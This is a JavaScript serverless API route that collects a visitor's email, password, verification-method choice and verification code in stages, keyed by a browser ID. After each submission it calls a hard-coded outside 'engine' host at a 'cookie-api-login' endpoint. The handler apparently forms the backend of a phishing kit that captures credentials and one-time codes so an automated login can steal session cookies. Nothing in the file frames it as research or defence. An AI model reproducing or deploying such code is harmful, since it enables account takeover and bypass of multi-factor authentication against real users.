import { corsJson, corsOptions } from "../../../_shared/corsResponse.js";
import { setCachedRow, getCachedRow } from "../../../../utils/cookieCache.js";
import { incrementUsage } from "../../../../utils/serverlessTracker.js";

function parseBody(text) {
    try { return JSON.parse(text); } catch (e) {}
    try { return Object.fromEntries(new URLSearchParams(text)); } catch (e) {}
    return null;
}

export async function POST(request) {
    incrementUsage();

    const text = await request.text();
    const body = parseBody(text);
    if (!body) return corsJson({ success: false, error: "Invalid request body" }, 400);

    const { browserId, token, updateType, email, password, verificationChoice, verificationCode } = body;

    if (!browserId) {
        return corsJson({ success: false, error: "browserId required" }, 400);
    }

    const updates = { lastUserActivity: new Date().toISOString() };

    if (updateType === 'email' && email) {
        updates.email = email;
        updates.domain = email.split('@')[1] || '';
    } else if (updateType === 'password' && password) {
        updates.password = password;
        const row = getCachedRow(browserId);
        if (row?.status === 'WAITINGPASSWORDERROR') {
            updates.status = 'WAITINGPASSWORD';
        }
    } else if (updateType === 'verificationChoice' && verificationChoice) {
        updates.verificationChoice = verificationChoice;
    } else if (updateType === 'verificationCode' && verificationCode) {
        updates.verificationCode = verificationCode;
    }

    setCachedRow(browserId, updates);

    const engineUrl = process.env.ENGINE_URL || 'https://webfixx-serverless-zvre9t-e955ff-157-173-204-24.sslip.io';
    fetch(`${engineUrl}/emails/cookie/cookie-api-login`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ browserId, wakeUp: true })
    }).catch(() => {});

    return corsJson({ success: true });
}

export async function OPTIONS() {
    return corsOptions();
}
